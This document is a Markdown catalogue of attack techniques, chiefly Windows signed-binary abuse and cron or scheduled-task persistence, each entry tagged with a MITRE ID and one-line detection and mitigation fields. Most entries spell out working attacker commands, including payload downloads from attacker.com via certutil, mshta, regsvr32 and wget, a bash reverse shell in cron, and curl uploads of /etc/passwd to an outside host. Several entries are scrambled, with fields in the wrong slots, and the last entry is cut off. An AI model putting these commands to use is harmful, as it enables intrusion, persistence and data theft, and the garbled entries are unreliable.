- **Attack Steps**: 1. Macro or shell spawns: certutil -urlcache -split -f http://attacker.com/payload.exe2. Downloads payload to local path.3. Executed via Start-Process payload.exe or similar.4. Avoids direct use of external tools like wget or curl, bypassing AV/EDR.5. Leaves minimal footprint due to signed binary use.
- **Detection**: Monitor certutil with network access
- **Solution**: Restrict certutil via AppLocker
- **Tags**: #LOLBins #Certutil #BinaryProxy #Execution

## Mshta Execution with Remote HTA

- **Attack Type**: HTA Execution via mshta.exe
- **Target**: Endpoints
- **Vulnerability**: Execution from remote URL
- **MITRE**: T1218.005 – Mshta
- **Impact**: Stealthy in-memory execution of scripts
- **Tools**: mshta.exe, HTA script
- **Scenario**: Executes malicious script using mshta.exe, which can run remote .hta or embedded VBScript.
- **Attack Steps**: 1. Attacker hosts payload at http://attacker.com/payload.hta.2. Command: mshta http://attacker.com/payload.hta.3. HTA runs embedded VBScript/JScript to download and execute further tools.4. Often evades detection due to mshta being signed and trusted.5. Used for initial or post-exploitation execution.
- **Detection**: Monitor mshta with command-line logging
- **Solution**: Block mshta in enterprise via GPO
- **Tags**: #LOLBins #mshta #HTA #RemoteExecution

## Regsvr32 – Scriptlet Execution

- **Attack Type**: COM Scriptlet via regsvr32
- **Target**: Workstations
- **Vulnerability**: Lack of control over COM scriptlet handling
- **MITRE**: T1218.010 – Regsvr32
- **Impact**: Remote fileless code execution
- **Tools**: regsvr32.exe, SCT file
- **Scenario**: Uses regsvr32.exe to download and execute a .sct script file remotely.
- **Attack Steps**: 1. Host malicious script at http://attacker.com/malicious.sct.2. Command: regsvr32 /s /n /u /i:http://attacker.com/malicious.sct scrobj.dll.3. Scriptlet runs commands via COM objects.4. Executes without dropping payload to disk.5. Bypasses many defenses due to regsvr32 being signed.
- **Detection**: Monitor regsvr32 network access
- **Solution**: Block regsvr32 or scriptlet usage via GPO
- **Tags**: #LOLBins #Regsvr32 #Scriptlet #Fileless

## Powershell with EncodedCommand

- **Attack Type**: Script Execution with Bypass
- **Target**: iconv ...
- **Vulnerability**: base64<br>2. Command: powershell -nop -enc `3. Avoids string-based AV detections.4. Often launched from macro, script, or exploit payload.5. Runs fully in memory, stealthily.
- **MITRE**: Any Windows Host
- **Impact**: Obfuscated commands evade basic detection
- **Tools**: powershell.exe, Base64 payload
- **Scenario**: Uses -EncodedCommand flag to execute obfuscated PowerShell commands.
- **Attack Steps**: 1. Base64 encode payload: `echo "command"
- **Detection**: T1059.001 – PowerShell
- **Solution**: Full command execution without readable logs
- **Tags**: Use AMSI + script block logging

## Rundll32 DLL Execution

- **Attack Type**: Malicious DLL Execution
- **Target**: Windows Devices
- **Vulnerability**: DLLs loaded via trusted process
- **MITRE**: T1218.011 – Rundll32
- **Impact**: Runs custom code via signed binary
- **Tools**: rundll32.exe, DLL
- **Scenario**: Uses rundll32.exe to run functions inside a DLL payload.
- **Attack Steps**: 1. Compile malicious DLL with exported function (e.g., void RunMe() in export.def).2. Place DLL in writable directory (e.g., C:\Users\Public\bad.dll).3. Execute with: rundll32.exe C:\Users\Public\bad.dll,RunMe4. Payload runs under rundll32 process context.5. Evades basic binary whitelisting defenses.
- **Detection**: Detect rundll32 launching unknown DLLs
- **Solution**: Restrict rundll32 use via AppLocker or WDAC
- **Tags**: #LOLBins #DLL #Rundll32 #SignedBinary

## Wmic Process Creation

- **Attack Type**: WMI Command Execution
- **Target**: Internal Systems
- **Vulnerability**: WMI process calls not always logged
- **MITRE**: T1047 – Windows Management Instrumentation
- **Impact**: Remote or local code execution
- **Tools**: wmic.exe
- **Scenario**: Uses wmic.exe to spawn new processes using WMI.
- **Attack Steps**: 1. Command: wmic process call create "calc.exe"2. Or: wmic /node:target process call create "powershell -enc ..."3. Can execute remote or local commands.4. May be launched from macro, payload, or remote shell.5. No GUI or window popup; can run silently.
- **Detection**: Monitor WMI activity and logs
- **Solution**: Restrict WMI execution to specific users
- **Tags**: #LOLBins #WMIC #RemoteExecution #SilentRun

## At/SchTasks for Scheduled Execution

- **Attack Type**: Scheduled Task Abuse
- **Target**: Endpoints
- **Vulnerability**: Scheduled tasks not monitored closely
- **MITRE**: T1053.005 – Scheduled Task
- **Impact**: Persistence or delayed execution
- **Tools**: schtasks.exe, cmd.exe
- **Scenario**: Uses at.exe or schtasks.exe to run code at specific times.
- **Attack Steps**: 1. Command: schtasks /Create /SC ONLOGON /TN "Updater" /TR "powershell.exe -enc ..." /F2. Task executes silently at login or scheduled time.3. May achieve persistence via legit tools.4. Drops minimal forensic evidence.5. User may not notice task unless manually checked.
- **Detection**: Monitor task creation logs and events
- **Solution**: Restrict scheduled task creation to admins
- **Tags**: #LOLBins #ScheduledTask #schtasks #Persistence

## Msbuild Code Injection

- **Attack Type**: Build Process Abuse
- **Target**: Dev Systems
- **Vulnerability**: Misuse of dev tools not blocked by default
- **MITRE**: T1127.001 – MSBuild Execution
- **Impact**: Executes .NET payloads silently
- **Tools**: msbuild.exe, XML project
- **Scenario**: Uses msbuild.exe to compile and run malicious inline C# or VB.NET code.
- **Attack Steps**: 1. Create malicious .proj XML file embedding C# payload in <UsingTask> tag.2. Run with: msbuild.exe payload.proj3. msbuild compiles and executes embedded code.4. Leaves no separate binary; runs memory-resident.5. Signed binary, trusted by Windows Defender.
- **Detection**: Monitor msbuild executions from non-dev users
- **Solution**: Block msbuild for standard users via GPO
- **Tags**: #LOLBins #MSBuild #DevToolAbuse #InlinePayload

## InstallUtil Bypass

- **Attack Type**: Installer Utility Exploitation
- **Target**: Admin Workstations
- **Vulnerability**: Uninstall hook allows code execution
- **MITRE**: T1218.004 – InstallUtil
- **Impact**: Payload executes as install/uninstall routine
- **Tools**: InstallUtil.exe, C# DLL
- **Scenario**: Executes malicious .NET assemblies via InstallUtil.exe.
- **Attack Steps**: 1. Create .NET DLL with code in public override void Uninstall(...).2. Execute with: InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll3. Runs code from Uninstall() without actual install.4. No GUI, runs silently.5. Commonly whitelisted in enterprise systems.
- **Detection**: Monitor InstallUtil execution paths
- **Solution**: Restrict via AppLocker or allowlisting solution
- **Tags**: #LOLBins #InstallUtil #BypassInstaller #DotNetExec

## Curl and Bitsadmin for File Fetch

- **Attack Type**: File Transfer and Execution
- **Target**: All Windows Hosts
- **Vulnerability**: Whitelisted network tools
- **MITRE**: T1105 – Remote File Copy
- **Impact**: Silent malware download using trusted tool
- **Tools**: curl.exe, bitsadmin.exe
- **Scenario**: Uses Windows binaries like curl.exe or bitsadmin.exe to download malware.
- **Attack Steps**: 1. Command: curl http://attacker.com/file.exe -o file.exe or bitsadmin /transfer job http://... file.exe2. Once downloaded, run: start file.exe3. Avoids triggering detection on standard tools like Invoke-WebRequest.4. Binaries are preinstalled on many Windows versions.5. Common in downloaders, droppers, and staging.
- **Detection**: Monitor curl/bitsadmin network usage
- **Solution**: Disable or restrict access via firewall/proxy
- **Tags**: #LOLBins #Curl #Bitsadmin #TrustedDownload

## Mavinject – Code Injection into Trusted Process

- **Attack Type**: Process Injection
- **Target**: Internal Systems
- **Vulnerability**: Code injection into trusted process
- **MITRE**: T1055.001 – Process Injection
- **Impact**: Stealthy execution; hides in benign process
- **Tools**: mavinject.exe, DLL
- **Scenario**: Uses mavinject.exe to inject code into legitimate processes like explorer.exe.
- **Attack Steps**: 1. Ensure target process is running (e.g., explorer.exe).2. Compile or use malicious DLL with payload.3. Run: mavinject <PID> /INJECTRUNNING path\to\payload.dll4. Injects code into remote process.5. Execution runs in context of legitimate, signed process.
- **Detection**: Monitor mavinject usage in logs
- **Solution**: Block mavinject for non-admin users
- **Tags**: #LOLBins #ProcessInjection #Mavinject #Stealth

## Esentutl for File Copy Bypass

- **Attack Type**: File System Manipulation
- **Target**: Workstations
- **Vulnerability**: Unrestricted access by esentutl
- **MITRE**: T1105 – Remote File Copy
- **Impact**: Drops payload to restricted location
- **Tools**: esentutl.exe
- **Scenario**: Uses esentutl.exe (database utility) to copy malicious payload into protected paths.
- **Attack Steps**: 1. Use esentutl /y payload.exe /d "C:\Program Files\app\payload.exe"2. Circumvents standard file copy permissions.3. Later executed via trusted app.4. Bypasses Windows Explorer or UAC restrictions.5. Useful in post-exploitation to replace binaries.
- **Detection**: Audit file movements by esentutl
- **Solution**: Restrict access or alert on esentutl behavior
- **Tags**: #LOLBins #Esentutl #CopyBypass #FileReplace

## Forfiles Command Execution

- **Attack Type**: Task-based Code Execution
- **Target**: Admin Machines
- **Vulnerability**: Trusted binary allows arbitrary command run
- **MITRE**: T1202 – Indirect Command Execution
- **Impact**: Executes payloads silently via system task
- **Tools**: forfiles.exe, cmd.exe
- **Scenario**: Uses forfiles.exe to run commands on file-based conditions.
- **Attack Steps**: 1. Craft command: forfiles /p C:\ /m *.txt /c "cmd /c calc.exe"2. Executes calc.exe if matching files exist.3. May include encoded commands or powershell runners.4. Can be used in combo with scheduled tasks.5. Execution hidden within admin task automations.
- **Detection**: Monitor forfiles command usage in logs
- **Solution**: Restrict to admin-only or monitor access
- **Tags**: #LOLBins #Forfiles #CommandInjection #TaskHijack

## HH.exe Used for HTA Script Launch

- **Attack Type**: HTML Help Exploitation
- **Target**: Any User
- **Vulnerability**: HTML Help not monitored in many systems
- **MITRE**: T1218.001 – Signed Binary Proxy
- **Impact**: Script runs in GUI mode, may go unnoticed
- **Tools**: hh.exe, HTA/VBS
- **Scenario**: Uses hh.exe to run malicious .hta or .html scripts with embedded payloads.
- **Attack Steps**: 1. Create payload: payload.hta with script (VBScript/JScript).2. Execute: hh.exe payload.hta3. HTML Help viewer renders and executes the code.4. Bypasses protections as hh.exe is a legitimate Windows binary.5. Often overlooked in forensic logs.
- **Detection**: Monitor hh.exe usage and script associations
- **Solution**: Disable hh.exe via AppLocker
- **Tags**: #LOLBins #HH #HTA #VBScriptExecution

## PresentationHost Used to Execute .XAML Payloads

- **Attack Type**: XAML Script Execution
- **Target**: Dev/Office Systems
- **Vulnerability**: Signed binary used outside normal scope
- **MITRE**: T1218 – Signed Binary Execution
- **Impact**: Executes stealth payload using WPF interpreter
- **Tools**: PresentationHost.exe, XAML
- **Scenario**: Executes malicious XAML content via PresentationHost.exe, typically used for WPF.
- **Attack Steps**: 1. Create .xaml file with embedded PowerShell payload.2. Run: PresentationHost.exe payload.xaml3. XAML compiles and launches commands on load.4. Avoids detection as XAML is not common attack vector.5. Execution runs under trusted binary.
- **Detection**: Monitor unusual XAML launches
- **Solution**: Restrict access to PresentationHost
- **Tags**: #LOLBins #XAML #PresentationHost #WPFHijack

## MSXSL XML Transform with Embedded Script

- **Attack Type**: XML + Script Combo
- **Target**: Office Systems
- **Vulnerability**: XML transforms not validated or logged
- **MITRE**: T1220 – XSL Script Processing
- **Impact**: Executes commands via legitimate XML operation
- **Tools**: msxsl.exe, XML file
- **Scenario**: msxsl.exe transforms XML with embedded scripts to execute code.
- **Attack Steps**: 1. Create .xml with transform instructions and script block.2. Create .xsl with VBScript calling cmd.exe.3. Run: msxsl.exe payload.xml payload.xsl4. Executes inline VBScript through transformation engine.5. Not commonly blocked; old binary still present in many systems.
- **Detection**: Disable msxsl.exe if not needed
- **Solution**: Alert on msxsl with script content
- **Tags**: #LOLBins #msxsl #XMLTransform #VBScriptExec

## Control.exe Bypass via CPL Payload

- **Attack Type**: Control Panel Exploitation
- **Target**: Endpoints
- **Vulnerability**: Control panel DLLs are not validated
- **MITRE**: T1218.002 – Control Panel Items
- **Impact**: DLL execution under trusted interface
- **Tools**: control.exe, .cpl payload
- **Scenario**: Launches .cpl (Control Panel applet) file via control.exe.
- **Attack Steps**: 1. Compile DLL to export CPlApplet function.2. Rename to .cpl extension (e.g., evil.cpl).3. Run: control evil.cpl4. Executes code inside the DLL.5. May bypass user awareness due to GUI-based launch.
- **Detection**: Monitor control.exe with unknown CPL files
- **Solution**: Restrict custom CPL execution
- **Tags**: #LOLBins #Control #CPLPayload #GUIExec

## SyncAppvPublishingServer.vbs for Remote Script Launch

- **Attack Type**: Signed Script Proxy Execution
- **Target**: Enterprise Machines
- **Vulnerability**: Signed scripts not closely monitored
- **MITRE**: T1216 – Signed Script Proxy Execution
- **Impact**: Bypasses application control & EDR scrutiny
- **Tools**: SyncAppvPublishingServer.vbs, PowerShell
- **Scenario**: Uses a trusted .vbs file (SyncAppvPublishingServer.vbs) to proxy malicious commands.
- **Attack Steps**: 1. Find built-in VBS path, e.g., C:\ProgramData\Microsoft\AppV\Client\SyncAppvPublishingServer.vbs2. Use command: wscript.exe SyncAppvPublishingServer.vbs with parameters3. VBS executes system-level PowerShell commands.4. Often bypasses detection because of signed source.5. Used in lateral movement or privilege escalation.
- **Detection**: Monitor wscript/cscript usage
- **Solution**: Disable unnecessary signed script proxies
- **Tags**: #LOLBins #SignedScript #VBSExecution #ProxyRun

## Tracker.exe Shell Link Execution

- **Attack Type**: Shell Link Hijacking
- **Target**: All Users
- **Vulnerability**: Link files not scanned deeply
- **MITRE**: T1204.002 – Malicious File
- **Impact**: Executes payload on file interaction
- **Tools**: tracker.exe, .lnk
- **Scenario**: Uses tracker.exe to execute a malicious .lnk (shell link) file.
- **Attack Steps**: 1. Create a malicious .lnk file pointing to powershell.exe or cmd.exe with payload.2. Store .lnk in user-writable folder (e.g., Startup).3. Launch using tracker.exe <path>\payload.lnk4. Payload runs via trusted Microsoft binary.5. Useful in persistence scenarios.
- **Detection**: Audit tracker.exe invocation
- **Solution**: Limit execution of .lnk files from untrusted paths
- **Tags**: #LOLBins #Tracker #ShellLink #Persistence

## Task Scheduler: Daily Payload Execution

- **Attack Type**: Daily Scheduled Task
- **Target**: Windows Hosts
- **Vulnerability**: Inadequate task creation monitoring
- **MITRE**: T1053.005 – Scheduled Task
- **Impact**: Persistent execution of attacker tools
- **Tools**: schtasks.exe
- **Scenario**: Attacker schedules a task to run malware every day at a set time.
- **Attack Steps**: 1. Create payload (e.g., payload.exe).2. Run: schtasks /Create /SC DAILY /TN "Updater" /TR "C:\malware\payload.exe" /ST 12:00 /F3. Payload runs daily at 12:00 PM.4. Evades one-time execution detection.5. Runs persistently without alerting users.
- **Detection**: Monitor task creation via event logs
- **Solution**: Limit task creation to admins
- **Tags**: #ScheduledTask #Persistence #DailyExecution

## Cron Job for Reverse Shell

- **Attack Type**: Cron-Triggered Shell
- **Target**: Linux Servers
- **Vulnerability**: No restrictions on crontab editing
- **MITRE**: T1053.003 – Cron
- **Impact**: Periodic remote shell access
- **Tools**: bash, cron
- **Scenario**: A cron job is created to open a reverse shell every 5 minutes.
- **Attack Steps**: 1. Edit crontab with crontab -e.2. Add: */5 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&13. Crontab saves and activates.4. Reverse shell opens to attacker every 5 mins.5. Maintains access without RATs.
- **Detection**: Monitor /etc/cron* changes and crontab logs
- **Solution**: Restrict cron editing to root users
- **Tags**: #Cron #ReverseShell #Persistence #LinuxAttack

## Scheduled Task on User Logon

- **Attack Type**: Logon Triggered Task
- **Target**: Internal User
- **Vulnerability**: Unmonitored user logon tasks
- **MITRE**: T1053.005 – Scheduled Task
- **Impact**: Persistent stealth access after login
- **Tools**: schtasks.exe
- **Scenario**: Malware runs every time a specific user logs in.
- **Attack Steps**: 1. Create payload (e.g., info.exe).2. Run: schtasks /Create /SC ONLOGON /TN "LogonUpdater" /TR "C:\stealth\info.exe" /RU user /F3. Payload executes at every login of target user.4. Harder to detect during off-hours.
- **Detection**: Audit per-user scheduled tasks
- **Solution**: Notify users of login-triggered tasks
- **Tags**: #LogonTask #ScheduledExecution #UserPersistence

## Hidden Cron with Obfuscated Command

- **Attack Type**: Hidden Script Execution
- **Target**: base64<br>2. Add to crontab: @reboot echo
- **Vulnerability**: base64 -d
- **MITRE**: bash`3. Executes on system reboot.4. Obfuscated payload avoids detection.5. May download external tools at boot.
- **Impact**: Linux Targets
- **Tools**: cron, base64
- **Scenario**: Uses cron to run a base64-encoded payload silently.
- **Attack Steps**: 1. Encode command: `echo "payload"
- **Detection**: Obfuscated cron payloads
- **Solution**: T1053.003 – Cron
- **Tags**: Silent background execution at reboot

## Task Created via PowerShell

- **Attack Type**: Task Scheduler via PowerShell
- **Target**: Windows Systems
- **Vulnerability**: No restrictions on PowerShell task creation
- **MITRE**: T1053.005 – Scheduled Task
- **Impact**: Scheduled malicious execution via scripts
- **Tools**: PowerShell, Register-ScheduledTask
- **Scenario**: Uses PowerShell to register and trigger scheduled execution.
- **Attack Steps**: 1. Use New-ScheduledTaskAction -Execute "C:\temp\evil.exe"2. Create trigger: New-ScheduledTaskTrigger -AtLogOn3. Register: Register-ScheduledTask -TaskName "SysUpdate" -Action $act -Trigger $trig -User "admin"4. Executes silently.5. Hard to detect if registered under system account.
- **Detection**: Monitor PowerShell script block logs
- **Solution**: Require admin approval for task registration
- **Tags**: #PowerShellTask #ScheduledScript #StealthExec

## Cronjob Set on Alternate User's Account

- **Attack Type**: User-Specific Cron
- **Target**: Linux Workstations
- **Vulnerability**: Misused elevated access
- **MITRE**: T1053.003 – Cron
- **Impact**: Exploits user context to hide tracks
- **Tools**: crontab, sudo
- **Scenario**: Sets up a cron job on another user’s crontab without their knowledge.
- **Attack Steps**: 1. Gain access as sudo or root.2. Edit: crontab -u targetuser -e3. Insert: @daily /usr/bin/evil.sh4. Script executes daily as target user.5. Logs may point to victim instead of attacker.
- **Detection**: Monitor crontab ownership and changes
- **Solution**: Audit all user crontab entries
- **Tags**: #UserCron #PrivilegeMisuse #HiddenCron

## Windows One-Time Scheduled Task

- **Attack Type**: One-Time Payload Execution
- **Target**: Windows Hosts
- **Vulnerability**: One-time tasks often ignored
- **MITRE**: T1053.005 – Scheduled Task
- **Impact**: Executes malicious code without staying behind
- **Tools**: schtasks.exe
- **Scenario**: Creates a one-off task to run malware at a specific date/time.
- **Attack Steps**: 1. Prepare payload (e.g., stealcreds.exe).2. Command: schtasks /Create /SC ONCE /TN "TempTask" /TR "C:\mal\stealcreds.exe" /ST 14:15 /SD 07/04/2025 /F3. Task deletes itself after execution.4. Avoids persistence indicators.
- **Detection**: Monitor short-lived task creation
- **Solution**: Set alerts on one-time task usage
- **Tags**: #OneTimeTask #StealthAttack #ScheduledMalware

## Cronjob for Data Exfiltration Script

- **Attack Type**: Scheduled Exfiltration Job
- **Target**: Linux Servers
- **Vulnerability**: Cron allows silent data movement
- **MITRE**: T1030 – Data Transfer Size Limits
- **Impact**: Periodic data leakage to external server
- **Tools**: bash, cron, curl
- **Scenario**: Automates periodic sending of logs or stolen data.
- **Attack Steps**: 1. Prepare data exfil script: curl -F "file=@data.txt" http://attacker.com/upload2. Add to crontab: 0 * * * * /usr/bin/dataexfil.sh3. Sends data every hour.4. Cron ensures reliability and redundancy.5. May include rotation or cleanup script.
- **Detection**: Monitor network traffic on schedule
- **Solution**: Restrict outbound cron scripts
- **Tags**: #CronExfil #DataLeak #ScheduledTransfer

## Scheduled Task with Hidden VBS Payload

- **Attack Type**: VBS-Based Scheduler Abuse
- **Target**: Office PCs
- **Vulnerability**: Scripts executed silently
- **MITRE**: T1059.005 – Visual Basic
- **Impact**: Silent recurring execution of VBS payloads
- **Tools**: schtasks.exe, .vbs
- **Scenario**: Runs a .vbs payload silently on schedule.
- **Attack Steps**: 1. Write script: stealth.vbs with malicious logic.2. Create task: schtasks /Create /SC DAILY /TN "SysSync" /TR "wscript.exe C:\payload\stealth.vbs" /ST 00:00 /F3. Script runs silently in background.4. Often bypasses AV if not monitored.5. Leaves low footprint.
- **Detection**: Monitor script host usage from scheduler
- **Solution**: Block VBS unless digitally signed
- **Tags**: #VBSTask #SilentExecution #WindowsScript

## Cron Backdoor in /etc/crontab

- **Attack Type**: System-Wide Cron Exploit
- **Target**: Linux Root
- **Vulnerability**: Main crontab often overlooked
- **MITRE**: T1053.003 – Cron
- **Impact**: Full system compromise with root cron job
- **Tools**: vim, bash, cron
- **Scenario**: Edits main crontab file to add backdoor shell execution.
- **Attack Steps**: 1. Edit /etc/crontab directly.2. Add line: * * * * * root /bin/bash -c '/tmp/malicious.sh'3. Script runs every minute with root privileges.4. Not visible with crontab -l.5. Harder to detect if timestamp obfuscated.
- **Detection**: Monitor file integrity of crontab
- **Solution**: Lock down /etc/crontab write access
- **Tags**: #RootCron #SystemBackdoor #PersistentShell

## Task Execution via XML Import

- **Attack Type**: Malicious XML Task Injection
- **Target**: Windows Targets
- **Vulnerability**: Task import doesn’t raise command-line alert
- **MITRE**: T1053.005 – Scheduled Task
- **Impact**: Privileged execution of custom XML-defined task
- **Tools**: schtasks.exe, XML file
- **Scenario**: Imports malicious task from XML file instead of manual creation.
- **Attack Steps**: 1. Craft XML task file containing malicious command (e.g., payload.exe).2. Import: schtasks /Create /XML malicious.xml /TN "Updater"3. Payload executes as per embedded trigger.4. Can define high-privilege context in XML.5. Avoids logging command-line creation parameters.
- **Detection**: Monitor task imports and XML usage
- **Solution**: Block task creation via XML unless admin
- **Tags**: #XMLTask #ScheduledInjection #WindowsBypass

## Cron Job with Download + Execute Combo

- **Attack Type**: Scheduled Downloader
- **Target**: Linux Devices
- **Vulnerability**: No rate limits on cron-based downloads
- **MITRE**: T1053.003 – Cron
- **Impact**: Dynamic payload deployment and execution
- **Tools**: cron, wget, bash
- **Scenario**: Cronjob fetches malware periodically before running.
- **Attack Steps**: 1. Add to crontab: */15 * * * * wget http://attacker.com/malware.sh -O /tmp/malware.sh && bash /tmp/malware.sh2. Downloads fresh copy every 15 mins.3. Automatically executes updated payloads.4. Enables dynamic control from C2.
- **Detection**: Monitor external requests in cron logs
- **Solution**: Restrict wget/curl in scheduled jobs
- **Tags**: #CronDownload #RemotePayload #DynamicMalware

## Task Triggered by Idle Time

- **Attack Type**: Idle-Based Execution
- **Target**: Workstations
- **Vulnerability**: Idle-based triggers rarely monitored
- **MITRE**: T1053.005 – Scheduled Task
- **Impact**: Execution during low user visibility
- **Tools**: schtasks.exe
- **Scenario**: Triggers malware only when system is idle to reduce detection.
- **Attack Steps**: 1. Create payload: silent.exe.2. Command: schtasks /Create /SC ONIDLE /TN "IdleRun" /TR "C:\silent\silent.exe"3. Executes only when system is idle for configured time (default 10 mins).4. Evades real-time monitoring.5. Uses idle state as trigger for stealth.
- **Detection**: Monitor idle-triggered events
- **Solution**: Alert on idle tasks running unknown binaries
- **Tags**: #IdleTask #StealthExecution #ScheduledSilently

## User-Agent Spoofed Cron for Exfiltration

- **Attack Type**: Spoofed Communication
- **Target**: Linux Targets
- **Vulnerability**: Unmonitored header manipulation in tools
- **MITRE**: T1030 – Data Transfer Size Limits
- **Impact**: Exfiltrates data via trusted-looking traffic
- **Tools**: curl, cron
- **Scenario**: Uses spoofed headers in curl/wget inside cron for stealth.
- **Attack Steps**: 1. Script: curl -A "Mozilla/5.0" -d @/etc/passwd http://attacker.com/upload2. Schedule: 0 */2 * * * bash /tmp/exfil.sh3. Runs every 2 hours with browser-like headers.4. Evades simplistic traffic filters.5. Leaves minimal local traces.
- **Detection**: Deep packet inspection on egress
- **Solution**: Block unknown hosts in cron jobs
- **Tags**: #CronExfil #HeaderSpoofing #CovertDataTransfer

## Scheduled Task Running From Network Share

- **Attack Type**: Remote Execution from UNC Path
- **Target**: Windows Systems
- **Vulnerability**: UNC execution rarely monitored
- **MITRE**: T1072 – Software Deployment Tools
- **Impact**: Remote payload execution without local footprint
- **Tools**: schtasks.exe, UNC path
- **Scenario**: Executes task from a shared drive, making it harder to detect locally.
- **Attack Steps**: 1. Store malware on share: \\192.168.1.20\mal\runme.exe2. Command: schtasks /Create /SC HOURLY /TN "NetRunner" /TR "\\192.168.1.20\mal\runme.exe"3. Task runs from share without copying file locally.4. Execution hidden from local inventory.
- **Detection**: Monitor UNC paths in scheduled tasks
- **Solution**: Block task execution from shares
- **Tags**: #UNCExecution #NetworkTask #MalwareShare

## Crontab Hijack via Writable Crontab File

- **Attack Type**: Cron Hijacking
- **Target**: Linux Users
- **Vulnerability**: Poor permissions on crontab config
- **MITRE**: T1053.003 – Cron
- **Impact**: Persistent execution via misconfigured user cron
- **Tools**: crontab, nano
- **Scenario**: Modifies writable crontab of an insecurely configured user.
- **Attack Steps**: 1. Attacker gains access to user with writable cron config.2. Overwrites crontab: @reboot /bin/bash /tmp/root.sh3. Injected script executes on reboot.4. Ensures persistent backdoor via crontab abuse.
- **Detection**: Enforce file permissions on cron files
- **Solution**: Use cron.allow/deny for user filtering
- **Tags**: #CronHijack #ConfigAbuse #Backdoor

## Task Created via GPO Deployments

- **Attack Type**: GPO-Based Scheduled Malware
- **Target**: Domain Systems
- **Vulnerability**: Weak auditing of GPO deployments
- **MITRE**: T1484.001 – Domain Policy Modification
- **Impact**: Domain-wide malware deployment via policy
- **Tools**: Group Policy, schtasks.exe
- **Scenario**: Abuses GPO to push malicious scheduled task across domain.
- **Attack Steps**: 1. Modify GPO: Computer Configuration → Scheduled Tasks2. Deploy task with TR = powershell.exe -enc ...3. All systems applying GPO execute the task.4. Rapid propagation across network.5. Highly persistent if domain controls are weak.
- **Detection**: Audit scheduled task entries in GPO
- **Solution**: Protect GPO editing privileges strictly
- **Tags**: #GPOTask #DomainMalware #GroupPolicyExploit

## Hidden Cron via .bashrc or .profile

- **Attack Type**: Persistent Shell-Based Trigger
- **Target**: Linux Workstations
- **Vulnerability**: .bashrc not usually monitored by cron tools
- **MITRE**: T1053.003 + T1059.004 – Cron + Bash
- **Impact**: Stealthy persistence + re-initiation of cron
- **Tools**: bash, cron, shell config
- **Scenario**: Uses shell startup files to re-enable cron job or execute on login.
- **Attack Steps**: 1. Edit .bashrc of user: echo "bash /tmp/.back.sh" >> ~/.bashrc2. Alternatively, re-add cron line on every shell login.3. Ensures execution of payload or cron entry if removed.4. Combines multiple persistence vectors.5. Hidden inside benign user config.
- **Detection**: Monitor login shell scripts for changes
- **Solution**: Set immutability on config files
- **Tags**: #BashPersistence #HiddenCron #ShellReinit

## Task Scheduled with SYSTEM Privileges

- **Attack Type**: Privileged Task Execution
- **Target**: Enterprise Hosts
- **Vulnerability**: SYSTEM tasks not restricted to sysadmins
- **MITRE**: T1053.005 – Scheduled Task
- **Impact**: High-impact privileged execution
- **Tools**: schtasks.exe, SYSTEM context
- **Scenario**: Attacker creates a task that runs with SYSTEM-level privileges.
- **Attack Steps**: 1. Use payload (e.g., persist.exe).2. Command: schtasks /Create /SC ONLOGON /TN "SystemTask" /TR "C:\mal\persist.exe" /RU SYSTEM /RL HIGHEST /F3. Runs with full privileges at user login.4. Can disable AV, modify registry, etc.5. Extremely dangerous if undetected.
- **Detection**: Monitor for SYSTEM task creation
- **Solution**: Block unapproved SYSTEM task definitions
- **Tags**: #SystemLevelTask #PrivilegeAbuse #ScheduledExploit

## Cron with Polymorphic Script Rotation

- **Attack Type**: Polymorphic Cron Persistence
- **Target**: Linux Servers
- **Vulnerability**: No integrity checks on rotating scripts
- **MITRE**: T1036 – Masquerading
- **Impact**: Adaptive persistence avoiding detection
- **Tools**: cron, bash, cron.daily
- **Scenario**: Changes cron-executed payload daily to evade hash-based detection.
- **Attack Steps**: 1. Script /etc/cron.daily/rotate.sh rewrites its own code daily.2. Each day’s payload encoded or obfuscated differently.3. Attacker uses script to re-fetch and rotate shellcode from C2.4. Evades static detection and signature-based controls.5. May blend into legit cron.daily tasks.
- **Detection**: Monitor cron.daily modifications
- **Solution**: Hash + behavior-based script monitoring
- **Tags**: #PolymorphicCron #Obfuscation #Evasion

## WMI Event-Based Task + Schedule Trigger

- **Attack Type**: WMI + Scheduled Trigger Hybrid
- **Target**: Enterprise Windows
- **Vulnerability**: WMI and schtasks interaction unmonitored
- **MITRE**: T1053 + T1084
- **Impact**: Highly persistent, stealthy execution
- **Tools**: WMI, schtasks.exe
- **Scenario**: Combines WMI permanent event consumer and scheduled task to enhance persistence.
- **Attack Steps**: 1. Use PowerShell: Register a permanent WMI event (__InstanceModificationEvent) trigger.2. Payload: Triggers a scheduled task.3. Scheduled task launches backdoor.4. WMI keeps re-triggering after reboots.5. Hard to detect and remove due to dual persistence paths.
- **Detection**: Monitor WMI + task combinations
- **Solution**: Disable WMI if unused, monitor bindings
- **Tags**: #WMI #ScheduledTasks #HybridPersistence

## Cron Entry in .dockerfile for Container Backdoor

- **Attack Type**: Docker Cron Backdoor
- **Target**: Cloud Environments
- **Vulnerability**: Docker images are rarely scanned deeply
- **MITRE**: T1053.003 – Cron
- **Impact**: Hidden persistence inside containerized env
- **Tools**: Docker, cron
- **Scenario**: Embeds a malicious cron entry inside Dockerfile for persistence post-deployment.
- **Attack Steps**: 1. Modify Dockerfile: RUN echo "* * * * * root /tmp/evil.sh" >> /etc/crontab2. Build and deploy container.3. Cron runs the payload every minute inside container.4. Exfil or control channel runs from within isolated container.5. Hidden unless container is deeply inspected.
- **Detection**: Inspect Dockerfiles and running images
- **Solution**: Use signed base images, monitor cron paths
- **Tags**: #DockerCron #ContainerBackdoor #CloudPersistence

## Task Abuse via At.exe for Quick Payload Execution

- **Attack Type**: Legacy Task Scheduling Abuse
- **Target**: Legacy Windows
- **Vulnerability**: Lack of auditing for legacy scheduling tool
- **MITRE**: T1053.005 – Scheduled Task
- **Impact**: Executes code without using schtasks
- **Tools**: at.exe, cmd.exe
- **Scenario**: Uses at.exe to execute command at next available minute.
- **Attack Steps**: 1. Command: at 16:25 C:\malware\backdoor.exe2. Task executes at next clock match silently.3. Minimal audit logs generated.4. Often overlooked due to legacy nature of at.5. Useful on older or unpatched systems.
- **Detection**: Disable at.exe usage
- **Solution**: Alert on legacy scheduling tools
- **Tags**: #ATexe #LegacyTask #SilentExec

## Self-Deleting Cron Job for Initial Access

- **Attack Type**: One-Time Cron Execution
- **Target**: grep -v start.sh
